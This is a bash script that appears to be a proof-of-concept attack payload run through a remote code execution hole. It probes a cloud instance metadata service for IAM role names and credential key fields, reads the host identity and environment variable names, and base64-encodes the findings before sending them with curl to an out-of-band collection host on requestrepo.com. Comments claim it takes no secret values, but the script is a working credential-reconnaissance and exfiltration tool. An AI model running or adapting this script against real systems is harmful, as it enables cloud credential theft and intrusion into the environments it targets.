#!/usr/bin/env bash
# v3: IAM credential chain proof - ONLY role names + JSON key structure, NO secret values
OOB="http://zbs-skill-rce.zfr7h2q7.requestrepo.com"
send(){ curl -s -m 8 "$OOB/$1?d=$(printf '%s' "$2" | base64 2>/dev/null | tr -d '\n')" >/dev/null 2>&1; }

echo "=== ZBS-V3-IAM-PROOF START ==="

# Basic context
CTX="$(id 2>/dev/null);$(hostname 2>/dev/null)"
echo "CTX: $CTX"
send "v3ctx" "$CTX"

# IAM role list endpoint
ROLES_URL="http://100.96.0.96/volcstack/latest/iam/security_credentials/"
R=$(curl -s -m 10 -w "|%{http_code}" "$ROLES_URL" 2>/dev/null)
CODE="${R##*|}"; BODY="${R%|*}"
BLEN=$(printf '%s' "$BODY" | wc -c | tr -d ' ')
echo "IAM-LIST: code=$CODE len=$BLEN body_preview=$(printf '%s' "$BODY" | head -c 100)"
send "v3iam1" "code=$CODE len=$BLEN preview=$(printf '%s' "$BODY" | head -c 80 | tr '\n' ';')"

# If we got a role name list (200 with content)
if [ "$CODE" = "200" ] && [ "$BLEN" -gt 0 ] 2>/dev/null; then
  # Get first role name (trim whitespace)
  ROLE=$(printf '%s' "$BODY" | tr -d '[:space:]' | head -c 100)
  echo "ROLE: $ROLE"
  
  # Fetch credential structure - KEYS ONLY, no values
  CRED_URL="http://100.96.0.96/volcstack/latest/iam/security_credentials/$ROLE"
  CR=$(curl -s -m 10 -w "|%{http_code}" "$CRED_URL" 2>/dev/null)
  CCODE="${CR##*|}"; CBODY="${CR%|*}"
  CLEN=$(printf '%s' "$CBODY" | wc -c | tr -d ' ')
  # Extract JSON key names only (e.g. AccessKeyId, SecretAccessKey, Token, Expiration)
  KEYS=$(printf '%s' "$CBODY" | grep -oE '"[A-Za-z][A-Za-z0-9_]+"[[:space:]]*:' | sed 's/[": ]//g' | tr '\n' ',')
  echo "CRED-KEYS: code=$CCODE len=$CLEN keys=$KEYS"
  send "v3iam2" "role=$ROLE code=$CCODE len=$CLEN keys=$KEYS"
else
  # Try alternate path formats
  for P in "volcstack/latest/iam/security_credentials" "latest/meta-data/iam/info" "volcstack/latest/meta-data/iam"; do
    R2=$(curl -s -m 6 -w "|%{http_code}" "http://100.96.0.96/$P" 2>/dev/null)
    C2="${R2##*|}"; B2="${R2%|*}"
    L2=$(printf '%s' "$B2" | wc -c | tr -d ' ')
    echo "ALT $P: code=$C2 len=$L2"
    send "v3alt" "path=$P code=$C2 len=$L2"
  done
fi

# Also check env for any IAM role hint (key names only, no values)
ENV_HINTS=$(env 2>/dev/null | grep -iE 'role|iam|instance|identity' | awk -F= '{print $1}' | tr '\n' ',')
echo "ENV-IAM-HINTS: $ENV_HINTS"
send "v3env" "hints=$ENV_HINTS"

echo "=== ZBS-V3-IAM-PROOF END ==="
